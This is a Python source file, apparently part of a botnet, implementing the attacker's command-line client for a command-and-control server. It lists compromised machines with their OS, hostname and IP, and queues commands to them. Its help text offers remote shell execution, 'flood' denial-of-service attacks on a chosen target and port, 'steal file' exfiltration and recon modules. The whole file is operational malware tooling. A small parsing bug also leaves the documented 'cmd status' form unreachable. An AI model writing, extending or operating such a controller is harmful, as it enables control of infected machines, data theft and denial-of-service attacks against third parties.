"""
CLI cho attacker — kết nối vào CNC server qua Unix socket để ra lệnh.

Hỗ trợ các lệnh:
  bots list         — hiển thị tất cả bot
  bots count        — thống kê tổng/online/offline/theo OS
  bot info <id>     — chi tiết một bot
  cmd <bot_id> <module> [params...]  — gửi lệnh tới bot
  cmd status <id>   — xem kết quả lệnh
  help, exit
"""

import argparse
import json
import os
import socket
import sys


class CNCClient:
    def __init__(self, socket_path: str):
        self.socket_path = socket_path

    def _connect(self):
        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        sock.connect(self.socket_path)
        return sock

    def _send(self, sock, obj: dict) -> dict:
        sock.sendall((json.dumps(obj) + "\n").encode())
        line = b""
        while not line.endswith(b"\n"):
            chunk = sock.recv(4096)
            if not chunk:
                break
            line += chunk
        return json.loads(line.decode().strip())

    def bots_list(self):
        try:
            sock = self._connect()
            resp = self._send(sock, {"action": "bots_list"})
            sock.close()
            if resp.get("ok"):
                bots = resp.get("data", [])
                if not bots:
                    print("(no bots connected)")
                    return
                print(f"{'ID':<5} {'OS':<20} {'Arch':<10} {'Hostname':<20} {'IP':<18} {'Status':<8}")
                print("-" * 85)
                for b in bots:
                    os_str = f"{b.get('os','')} {b.get('os_version','')}".strip()
                    print(f"{b['id']:<5} {os_str:<20} {b.get('arch',''):<10} {b.get('hostname',''):<20} {b.get('ip',''):<18} {b.get('status',''):<8}")
            else:
                print(f"Error: {resp.get('error')}")
        except FileNotFoundError:
            print("CNC server not running (Unix socket not found)")
        except ConnectionRefusedError:
            print("CNC server not running (connection refused)")

    def bots_count(self):
        try:
            sock = self._connect()
            resp = self._send(sock, {"action": "bots_count"})
            sock.close()
            if resp.get("ok"):
                d = resp["data"]
                print(f"Total: {d['total']} | Online: {d['online']} | Offline: {d['offline']}")
                if d.get("by_os"):
                    parts = [f"{os_name}: {count}" for os_name, count in d["by_os"]]
                    print(" | ".join(parts))
            else:
                print(f"Error: {resp.get('error')}")
        except (FileNotFoundError, ConnectionRefusedError):
            print("CNC server not running")

    def bot_info(self, bot_id: str):
        try:
            sock = self._connect()
            resp = self._send(sock, {"action": "bot_info", "bot_id": bot_id})
            sock.close()
            if resp.get("ok"):
                b = resp["data"]
                print(f"  ID:         {b['id']}")
                print(f"  Bot ID:     {b['bot_id']}")
                print(f"  OS:         {b.get('os','')} {b.get('os_version','')}".strip())
                print(f"  Arch:       {b.get('arch','')}")
                print(f"  Kernel:     {b.get('kernel','')}")
                print(f"  Hostname:   {b.get('hostname','')}")
                print(f"  IP:         {b.get('ip','')}")
                print(f"  Status:     {b.get('status','')}")
                print(f"  Session:    {b.get('session_id','')}")
                print(f"  First seen: {_ts_to_str(b.get('first_seen'))}")
                print(f"  Last seen:  {_ts_to_str(b.get('last_seen'))}")
            else:
                print(f"Error: {resp.get('error')}")
        except (FileNotFoundError, ConnectionRefusedError):
            print("CNC server not running")

    def cmd_send(self, bot_id: str, module: str, params: dict):
        try:
            sock = self._connect()
            resp = self._send(sock, {"action": "cmd_send", "bot_id": bot_id, "module": module, "params": params})
            sock.close()
            if resp.get("ok"):
                print(f"Command queued: {resp['cmd_id']}")
            else:
                print(f"Error: {resp.get('error')}")
        except (FileNotFoundError, ConnectionRefusedError):
            print("CNC server not running")

    def cmd_status(self, cmd_id: str):
        try:
            sock = self._connect()
            resp = self._send(sock, {"action": "cmd_status", "cmd_id": cmd_id})
            sock.close()
            if resp.get("ok"):
                c = resp["data"]
                print(f"  Cmd ID:    {c['id']}")
                print(f"  Bot:       {c['bot_id']}")
                print(f"  Module:    {c['module']}")
                print(f"  Params:    {c['params']}")
                print(f"  Exit code: {c['exit_code']}")
                print(f"  Created:   {_ts_to_str(c.get('created_at'))}")
                print(f"  Completed: {_ts_to_str(c.get('completed_at'))}")
                print(f"  Output:")
                print(c.get('output', '(no output)'))
            else:
                print(f"Error: {resp.get('error')}")
        except (FileNotFoundError, ConnectionRefusedError):
            print("CNC server not running")

    def ping(self):
        try:
            sock = self._connect()
            resp = self._send(sock, {"action": "ping"})
            sock.close()
            print("CNC server: " + ("ONLINE" if resp.get("ok") else "ERROR"))
        except (FileNotFoundError, ConnectionRefusedError):
            print("CNC server: OFFLINE")


def _ts_to_str(ts) -> str:
    if ts is None:
        return "N/A"
    from datetime import datetime
    return datetime.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S")


def parse_params(args: list[str]) -> dict:
    """Parse key=value pairs từ command line args."""
    params = {}
    for a in args:
        if "=" in a:
            k, v = a.split("=", 1)
            params[k] = v
        else:
            params[f"arg{len(params)}"] = a
    return params


def main():
    parser = argparse.ArgumentParser(description="CNC CLI")
    parser.add_argument("--socket", "-s", default="/tmp/cnc.sock", help="Unix socket path")
    parser.add_argument("command", nargs="*", help="CLI command (optional, interactive if omitted)")
    args = parser.parse_args()

    client = CNCClient(args.socket)

    if not args.command:
        # Interactive mode
        print("CNC CLI — type 'help' for commands, 'exit' to quit")
        try:
            while True:
                try:
                    line = input("[CNC]> ").strip()
                except (EOFError, KeyboardInterrupt):
                    print()
                    break
                if not line:
                    continue
                _run_command(client, line)
        except KeyboardInterrupt:
            print()
    else:
        _run_command(client, " ".join(args.command))


def _run_command(client: CNCClient, line: str):
    parts = line.split()
    cmd_name = parts[0].lower()

    if cmd_name in ("exit", "quit", "q"):
        sys.exit(0)

    elif cmd_name == "help":
        print("""
Commands:
  bots list              List all bots
  bots count             Show bot statistics
  bot info <id>          Show bot details
  cmd <bot_id> shell <command>       Execute shell command
  cmd <bot_id> flood <type> <target> <port> [opts...]
  cmd <bot_id> steal file <path>
  cmd <bot_id> recon <type>
  cmd status <cmd_id>    Check command result
  ping                   Check if CNC server is online
  help                   This help
  exit                   Quit
""")

    elif cmd_name == "bots":
        if len(parts) >= 2 and parts[1] == "count":
            client.bots_count()
        else:
            client.bots_list()

    elif cmd_name == "bot":
        if len(parts) >= 3 and parts[1] == "info":
            client.bot_info(parts[2])
        else:
            print("Usage: bot info <id>")

    elif cmd_name == "cmd":
        if len(parts) >= 4 and parts[1] == "status":
            client.cmd_status(parts[2])
        elif len(parts) >= 4:
            bot_id = parts[1]
            module = parts[2]
            params = parse_params(parts[3:])
            client.cmd_send(bot_id, module, params)
        else:
            print("Usage: cmd <bot_id> <module> [params...]")
            print("       cmd status <cmd_id>")

    elif cmd_name == "ping":
        client.ping()

    else:
        print(f"Unknown command: {cmd_name}. Type 'help' for available commands.")


if __name__ == "__main__":
    main()
